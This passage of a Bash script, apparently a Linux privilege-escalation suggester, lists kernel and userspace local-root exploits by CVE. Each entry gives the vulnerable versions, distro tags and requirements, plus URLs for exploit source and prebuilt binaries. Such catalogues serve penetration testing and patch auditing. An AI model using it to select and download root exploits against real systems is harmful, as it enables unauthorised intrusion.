Tags: ubuntu=9.04
Rank: 1
analysis-url: https://xorl.wordpress.com/2009/07/16/cve-2009-1895-linux-kernel-per_clear_on_setid-personality-bypass/
src-url: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/9435.tgz
exploit-db: 9435
Comments: /proc/sys/vm/mmap_min_addr needs to equal 0 OR pulseaudio needs to be installed
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-2692,CVE-2009-1895]${txtrst} sock_sendpage2
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.30
Tags: 
Rank: 1
src-url: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/9436.tgz
exploit-db: 9436
Comments: Works for systems with /proc/sys/vm/mmap_min_addr equal to 0
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-2692,CVE-2009-1895]${txtrst} sock_sendpage3
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.30
Tags: 
Rank: 1
src-url: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/9641.tar.gz
exploit-db: 9641
Comments: /proc/sys/vm/mmap_min_addr needs to equal 0 OR pulseaudio needs to be installed
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-2692,CVE-2009-1895]${txtrst} sock_sendpage (ppc)
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.30
Tags: ubuntu=8.10,RHEL=4|5
Rank: 1
exploit-db: 9545
Comments: /proc/sys/vm/mmap_min_addr needs to equal 0
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-2698]${txtrst} udp_sendmsg (by spender)
Reqs: pkg=linux-kernel,ver>=2.6.1,ver<=2.6.19
Tags:
Rank: 1
src-url: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/9574.tgz
exploit-db: 9574
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-2698]${txtrst} udp_sendmsg
Reqs: pkg=linux-kernel,ver>=2.6.1,ver<=2.6.19
Tags: debian=4
Rank: 1
exploit-db: 9575
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-2698]${txtrst} ip_append_data
Reqs: pkg=linux-kernel,ver>=2.6.1,ver<=2.6.19,x86
Tags: fedora=4|5|6,RHEL=4
Rank: 1
exploit-db: 9542
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-3547]${txtrst} pipe.c 1
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.31
Tags:
Rank: 1
exploit-db: 33321
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-3547]${txtrst} pipe.c 2
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.31
Tags:
Rank: 1
exploit-db: 33322
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-3547]${txtrst} pipe.c 3
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.31
Tags:
Rank: 1
exploit-db: 10018
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2010-3301]${txtrst} ptrace_kmod2
Reqs: pkg=linux-kernel,ver>=2.6.26,ver<=2.6.34
Tags: debian=6.0{kernel:2.6.(32|33|34|35)-(1|2|trunk)-amd64},ubuntu=(10.04|10.10){kernel:2.6.(32|35)-(19|21|24)-server}
Rank: 1
bin-url: https://web.archive.org/web/20111103042904/http://tarantula.by.ru/localroot/2.6.x/kmod2
bin-url: https://web.archive.org/web/20111103042904/http://tarantula.by.ru/localroot/2.6.x/ptrace-kmod
bin-url: https://web.archive.org/web/20160602192641/https://www.kernel-exploits.com/media/ptrace_kmod2-64
exploit-db: 15023
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2010-1146]${txtrst} reiserfs
Reqs: pkg=linux-kernel,ver>=2.6.18,ver<=2.6.34
Tags: ubuntu=9.10
Rank: 1
exploit-db: 12130
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2010-2959]${txtrst} can_bcm
Reqs: pkg=linux-kernel,ver>=2.6.18,ver<=2.6.36
Tags: ubuntu=10.04{kernel:2.6.32-24-generic}
Rank: 1
bin-url: https://web.archive.org/web/20160602192641/https://www.kernel-exploits.com/media/can_bcm
exploit-db: 14814
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2010-3904]${txtrst} rds
Reqs: pkg=linux-kernel,ver>=2.6.30,ver<2.6.37
Tags: debian=6.0{kernel:2.6.(31|32|34|35)-(1|trunk)-amd64},ubuntu=10.10|9.10,fedora=13{kernel:2.6.33.3-85.fc13.i686.PAE},ubuntu=10.04{kernel:2.6.32-(21|24)-generic}
Rank: 1
analysis-url: http://www.securityfocus.com/archive/1/514379
src-url: http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c
bin-url: https://web.archive.org/web/20160602192641/https://www.kernel-exploits.com/media/rds
bin-url: https://web.archive.org/web/20160602192641/https://www.kernel-exploits.com/media/rds64
exploit-db: 15285
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2010-3848,CVE-2010-3850,CVE-2010-4073]${txtrst} half_nelson
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.36
Tags: ubuntu=(10.04|9.10){kernel:2.6.(31|32)-(14|21)-server}
Rank: 1
bin-url: http://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/half-nelson3
exploit-db: 17787
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[N/A]${txtrst} caps_to_root
Reqs: pkg=linux-kernel,ver>=2.6.34,ver<=2.6.36,x86
Tags: ubuntu=10.10
Rank: 1
exploit-db: 15916
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[N/A]${txtrst} caps_to_root 2
Reqs: pkg=linux-kernel,ver>=2.6.34,ver<=2.6.36
Tags: ubuntu=10.10
Rank: 1
exploit-db: 15944
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2010-4347]${txtrst} american-sign-language
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.36
Tags:
Rank: 1
exploit-db: 15774
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2010-3437]${txtrst} pktcdvd
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.36
Tags: ubuntu=10.04
Rank: 1
exploit-db: 15150
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2010-3081]${txtrst} video4linux
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.33
Tags: RHEL=5
Rank: 1
exploit-db: 15024
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2012-0056]${txtrst} memodipper
Reqs: pkg=linux-kernel,ver>=3.0.0,ver<=3.1.0
Tags: ubuntu=(10.04|11.10){kernel:3.0.0-12-(generic|server)}
Rank: 1
analysis-url: https://git.zx2c4.com/CVE-2012-0056/about/
src-url: https://git.zx2c4.com/CVE-2012-0056/plain/mempodipper.c
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/memodipper
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/memodipper64
exploit-db: 18411
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2012-0056,CVE-2010-3849,CVE-2010-3850]${txtrst} full-nelson
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.36
Tags: ubuntu=(9.10|10.10){kernel:2.6.(31|35)-(14|19)-(server|generic)},ubuntu=10.04{kernel:2.6.32-(21|24)-server}
Rank: 1
src-url: http://vulnfactory.org/exploits/full-nelson.c
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/full-nelson
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/full-nelson64
exploit-db: 15704
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2013-1858]${txtrst} CLONE_NEWUSER|CLONE_FS
Reqs: pkg=linux-kernel,ver=3.8,CONFIG_USER_NS=y
Tags: 
Rank: 1
src-url: http://stealth.openwall.net/xSports/clown-newuser.c
analysis-url: https://lwn.net/Articles/543273/
exploit-db: 38390
author: Sebastian Krahmer
Comments: CONFIG_USER_NS needs to be enabled 
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2013-2094]${txtrst} perf_swevent
Reqs: pkg=linux-kernel,ver>=2.6.32,ver<3.8.9,x86_64
Tags: RHEL=6,ubuntu=12.04{kernel:3.2.0-(23|29)-generic},fedora=16{kernel:3.1.0-7.fc16.x86_64},fedora=17{kernel:3.3.4-5.fc17.x86_64},debian=7{kernel:3.2.0-4-amd64}
Rank: 1
analysis-url: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/perf_swevent
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/perf_swevent64
exploit-db: 26131
author: Andrea 'sorbo' Bittau
Comments: No SMEP/SMAP bypass
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2013-2094]${txtrst} perf_swevent 2
Reqs: pkg=linux-kernel,ver>=2.6.32,ver<3.8.9,x86_64
Tags: ubuntu=12.04{kernel:3.(2|5).0-(23|29)-generic}
Rank: 1
analysis-url: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
src-url: https://cyseclabs.com/exploits/vnik_v1.c
exploit-db: 33589
author: Vitaly 'vnik' Nikolenko
Comments: No SMEP/SMAP bypass
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2013-0268]${txtrst} msr
Reqs: pkg=linux-kernel,ver>=2.6.18,ver<3.7.6
Tags: 
Rank: 1
exploit-db: 27297
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2013-1959]${txtrst} userns_root_sploit
Reqs: pkg=linux-kernel,ver>=3.0.1,ver<3.8.9
Tags: 
Rank: 1
analysis-url: http://www.openwall.com/lists/oss-security/2013/04/29/1
exploit-db: 25450
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2013-2094]${txtrst} semtex
Reqs: pkg=linux-kernel,ver>=2.6.32,ver<3.8.9
Tags: RHEL=6
Rank: 1
analysis-url: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
exploit-db: 25444
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2014-0038]${txtrst} timeoutpwn
Reqs: pkg=linux-kernel,ver>=3.4.0,ver<=3.13.1,CONFIG_X86_X32=y
Tags: ubuntu=13.10
Rank: 1
analysis-url: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/timeoutpwn64
exploit-db: 31346
Comments: CONFIG_X86_X32 needs to be enabled
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2014-0038]${txtrst} timeoutpwn 2
Reqs: pkg=linux-kernel,ver>=3.4.0,ver<=3.13.1,CONFIG_X86_X32=y
Tags: ubuntu=(13.04|13.10){kernel:3.(8|11).0-(12|15|19)-generic}
Rank: 1
analysis-url: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html
exploit-db: 31347
Comments: CONFIG_X86_X32 needs to be enabled
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2014-0196]${txtrst} rawmodePTY
Reqs: pkg=linux-kernel,ver>=2.6.31,ver<=3.14.3
Tags:
Rank: 1
analysis-url: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
exploit-db: 33516
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2014-2851]${txtrst} use-after-free in ping_init_sock() ${bldblu}(DoS)${txtrst}
Reqs: pkg=linux-kernel,ver>=3.0.1,ver<=3.14
Tags: 
Rank: 0
analysis-url: https://cyseclabs.com/page?n=02012016
exploit-db: 32926
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2014-4014]${txtrst} inode_capable
Reqs: pkg=linux-kernel,ver>=3.0.1,ver<=3.13
Tags: ubuntu=12.04
Rank: 1
analysis-url: http://www.openwall.com/lists/oss-security/2014/06/10/4
exploit-db: 33824
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2014-4699]${txtrst} ptrace/sysret
Reqs: pkg=linux-kernel,ver>=3.0.1,ver<=3.8
Tags: ubuntu=12.04
Rank: 1
analysis-url: http://www.openwall.com/lists/oss-security/2014/07/08/16
exploit-db: 34134
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2014-4943]${txtrst} PPPoL2TP ${bldblu}(DoS)${txtrst}
Reqs: pkg=linux-kernel,ver>=3.2,ver<=3.15.6
Tags: 
Rank: 1
analysis-url: https://cyseclabs.com/page?n=01102015
exploit-db: 36267
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2014-5207]${txtrst} fuse_suid
Reqs: pkg=linux-kernel,ver>=3.0.1,ver<=3.16.1
Tags: 
Rank: 1
exploit-db: 34923
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2015-9322]${txtrst} BadIRET
Reqs: pkg=linux-kernel,ver>=3.0.1,ver<3.17.5,x86_64
Tags: RHEL<=7,fedora=20
Rank: 1
analysis-url: http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/
src-url: http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz
exploit-db:
author: Rafal 'n3rgal' Wojtczuk & Adam 'pi3' Zabrocki
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2015-3290]${txtrst} espfix64_NMI
Reqs: pkg=linux-kernel,ver>=3.13,ver<4.1.6,x86_64
Tags: 
Rank: 1
analysis-url: http://www.openwall.com/lists/oss-security/2015/08/04/8
exploit-db: 37722
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[N/A]${txtrst} bluetooth
Reqs: pkg=linux-kernel,ver<=2.6.11
Tags:
Rank: 1
exploit-db: 4756
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2015-1328]${txtrst} overlayfs
Reqs: pkg=linux-kernel,ver>=3.13.0,ver<=3.19.0
Tags: ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic},ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
Rank: 1
analysis-url: http://seclists.org/oss-sec/2015/q2/717
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/ofs_32
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/ofs_64
exploit-db: 37292
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2015-8660]${txtrst} overlayfs (ovl_setattr)
Reqs: pkg=linux-kernel,ver>=3.0.0,ver<=4.3.3
Tags:
Rank: 1
analysis-url: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
exploit-db: 39230
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2015-8660]${txtrst} overlayfs (ovl_setattr)
Reqs: pkg=linux-kernel,ver>=3.0.0,ver<=4.3.3
Tags: ubuntu=(14.04|15.10){kernel:4.2.0-(18|19|20|21|22)-generic}
Rank: 1
analysis-url: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
exploit-db: 39166
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-0728]${txtrst} keyring
Reqs: pkg=linux-kernel,ver>=3.10,ver<4.4.1
Tags:
Rank: 0
analysis-url: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
exploit-db: 40003
Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-2384]${txtrst} usb-midi
Reqs: pkg=linux-kernel,ver>=3.0.0,ver<=4.4.8
Tags: ubuntu=14.04,fedora=22
Rank: 1
analysis-url: https://xairy.github.io/blog/2016/cve-2016-2384
src-url: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
exploit-db: 41999
Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user
author: Andrey 'xairy' Konovalov
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-4997]${txtrst} target_offset
Reqs: pkg=linux-kernel,ver>=4.4.0,ver<=4.4.0,cmd:grep -qi ip_tables /proc/modules
Tags: ubuntu=16.04{kernel:4.4.0-21-generic}
Rank: 1
src-url: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/40053.zip
Comments: ip_tables.ko needs to be loaded
exploit-db: 40049
author: Vitaly 'vnik' Nikolenko
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-4557]${txtrst} double-fdput()
Reqs: pkg=linux-kernel,ver>=4.4,ver<4.5.5,CONFIG_BPF_SYSCALL=y,sysctl:kernel.unprivileged_bpf_disabled!=1
Tags: ubuntu=16.04{kernel:4.4.0-(21|38|42|98|140)-generic}
Rank: 1
analysis-url: https://bugs.chromium.org/p/project-zero/issues/detail?id=808
src-url: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip
Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1
exploit-db: 40759
author: Jann Horn
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-5195]${txtrst} dirtycow
Reqs: pkg=linux-kernel,ver>=2.6.22,ver<=4.8.3
Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},ubuntu=16.04|14.04|12.04
Rank: 4
analysis-url: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
exploit-db: 40611
author: Phil Oester
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-5195]${txtrst} dirtycow 2
Reqs: pkg=linux-kernel,ver>=2.6.22,ver<=4.8.3
Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
Rank: 4
analysis-url: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
ext-url: https://www.exploit-db.com/download/40847.cpp
Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
exploit-db: 40839
author: FireFart (author of exploit at EDB 40839); Gabriele Bonacini (author of exploit at 'ext-url')
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-8655]${txtrst} chocobo_root
Reqs: pkg=linux-kernel,ver>=4.4.0,ver<4.9,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1
Tags: ubuntu=(14.04|16.04){kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic}
Rank: 1
analysis-url: http://www.openwall.com/lists/oss-security/2016/12/06/1
Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled
bin-url: https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/exploits/CVE-2016-8655/chocobo_root
exploit-db: 40871
author: rebel
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-9793]${txtrst} SO_{SND|RCV}BUFFORCE
Reqs: pkg=linux-kernel,ver>=3.11,ver<4.8.14,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1
Tags:
Rank: 1
analysis-url: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
src-url: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only
exploit-db: 41995
author: Andrey 'xairy' Konovalov
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2017-6074]${txtrst} dccp
Reqs: pkg=linux-kernel,ver>=2.6.18,ver<=4.9.11,CONFIG_IP_DCCP=[my]
Tags: ubuntu=(14.04|16.04){kernel:4.4.0-62-generic}
Rank: 1
analysis-url: http://www.openwall.com/lists/oss-security/2017/02/22/3
Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass
exploit-db: 41458
author: Andrey 'xairy' Konovalov
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2017-7308]${txtrst} af_packet
Reqs: pkg=linux-kernel,ver>=3.2,ver<=4.10.6,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1
Tags: ubuntu=16.04{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
Rank: 1
analysis-url: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
src-url: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels
bin-url: https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/exploits/cve-2017-7308/exploit
exploit-db: 41994
author: Andrey 'xairy' Konovalov (orginal exploit author); Brendan Coles (author of exploit update at 'ext-url')
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2017-16995]${txtrst} eBPF_verifier
Reqs: pkg=linux-kernel,ver>=4.4,ver<=4.14.8,CONFIG_BPF_SYSCALL=y,sysctl:kernel.unprivileged_bpf_disabled!=1
Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},ubuntu=(16.04|17.04){kernel:4.(8|10).0-(19|28|45)-generic}
Rank: 5
analysis-url: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1
bin-url: https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/exploits/cve-2017-16995/exploit.out
exploit-db: 45010
author: Rick Larabee
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2017-1000112]${txtrst} NETIF_F_UFO
Reqs: pkg=linux-kernel,ver>=4.4,ver<=4.13,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1
Tags: ubuntu=14.04{kernel:4.4.0-*},ubuntu=16.04{kernel:4.8.0-*}
Rank: 1
analysis-url: http://www.openwall.com/lists/oss-security/2017/08/13/1
src-url: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c
ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c
Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at 'ext-url' adds support for additional distros/kernels
bin-url: https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/exploits/cve-2017-1000112/exploit.out
exploit-db:
author: Andrey 'xairy' Konovalov (orginal exploit author); Brendan Coles (author of exploit update at 'ext-url')
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2017-1000253]${txtrst} PIE_stack_corruption
Reqs: pkg=linux-kernel,ver>=3.2,ver<=4.13,x86_64
Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
Rank: 1
analysis-url: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
src-url: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c
exploit-db: 42887
author: Qualys
Comments:
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2018-5333]${txtrst} rds_atomic_free_op NULL pointer dereference
Reqs: pkg=linux-kernel,ver>=4.4,ver<=4.14.13,cmd:grep -qi rds /proc/modules,x86_64
Tags: ubuntu=16.04{kernel:4.4.0|4.8.0}
Rank: 1
src-url: https://gist.githubusercontent.com/wbowling/9d32492bd96d9e7c3bf52e23a0ac30a4/raw/959325819c78248a6437102bb289bb8578a135cd/cve-2018-5333-poc.c
ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2018-5333/cve-2018-5333.c
Comments: rds.ko kernel module needs to be loaded. Modified version at 'ext-url' adds support for additional targets and bypassing KASLR.
author: wbowling (orginal exploit author); bcoles (author of exploit update at 'ext-url')
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2018-18955]${txtrst} subuid_shell
Reqs: pkg=linux-kernel,ver>=4.15,ver<=4.19.2,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1,cmd:[ -u /usr/bin/newuidmap ],cmd:[ -u /usr/bin/newgidmap ]
Tags: ubuntu=18.04{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
Rank: 1
analysis-url: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
src-url: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip
exploit-db: 45886
author: Jann Horn
Comments: CONFIG_USER_NS needs to be enabled
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2019-13272]${txtrst} PTRACE_TRACEME
Reqs: pkg=linux-kernel,ver>=4,ver<5.1.17,sysctl:kernel.yama.ptrace_scope==0,x86_64
Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},debian=10{kernel:4.19.0-*},fedora=30{kernel:5.0.9-*}
Rank: 1
analysis-url: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
src-url: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip
ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
Comments: Requires an active PolKit agent.
exploit-db: 47133
exploit-db: 47163
author: Jann Horn (orginal exploit author); bcoles (author of exploit update at 'ext-url')
EOF
)

############ USERSPACE EXPLOITS ###########################
n=0

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2004-0186]${txtrst} samba
Reqs: pkg=samba,ver<=2.2.8
Tags: 
Rank: 1
exploit-db: 23674
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-1185]${txtrst} udev
Reqs: pkg=udev,ver<141,cmd:[[ -f /etc/udev/rules.d/95-udev-late.rules || -f /lib/udev/rules.d/95-udev-late.rules ]]
Tags: ubuntu=8.10|9.04
Rank: 1
exploit-db: 8572
Comments: Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed 
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-1185]${txtrst} udev 2
Reqs: pkg=udev,ver<141
Tags:
Rank: 1
exploit-db: 8478
Comments: SSH access to non privileged user is needed. Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2010-0832]${txtrst} PAM MOTD
Reqs: pkg=libpam-modules,ver<=1.1.1
Tags: ubuntu=9.10|10.04
Rank: 1
exploit-db: 14339
Comments: SSH access to non privileged user is needed
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2010-4170]${txtrst} SystemTap
Reqs: pkg=systemtap,ver<=1.3
Tags: RHEL=5{systemtap:1.1-3.el5},fedora=13{systemtap:1.2-1.fc13}
Rank: 1
author: Tavis Ormandy
exploit-db: 15620
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2011-1485]${txtrst} pkexec
